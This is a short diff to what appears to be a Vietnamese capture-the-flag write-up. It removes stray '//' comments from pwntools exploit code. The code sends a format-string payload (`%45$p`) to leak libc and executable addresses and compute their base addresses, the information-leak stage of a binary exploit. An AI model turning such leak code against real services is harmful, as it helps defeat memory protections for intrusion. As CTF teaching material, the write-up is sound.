@@ -37,7 +37,7 @@ Nhập vào buffer vừa đúng 50 BYTES rồi đưa thêm format `%45$p` để 
     p.sendlineafter(b'>',b'3')
     
     p.recvuntil(b'printing ... \n')
-    libc_leak=int(p.recvuntil(b'>',drop=True),16)  //nhận địa chỉ
+    libc_leak=int(p.recvuntil(b'>',drop=True),16) 
     libc.address=libc_leak-0x2a1ca
     print(hex(libc.address))
 
@@ -54,7 +54,7 @@ Nhập vào buffer vừa đúng 50 BYTES rồi đưa thêm format `%45$p` để 
     p.sendlineafter(b'>',b'3')
     
     p.recvuntil(b'printing ... \n')
-    exe_leak=int(p.recvuntil(b'>',drop=True),16)  //nhận địa chỉ
+    exe_leak=int(p.recvuntil(b'>',drop=True),16) 
     exe.address=exe_leak-0x11a9
     print(hex(exe.address))
 
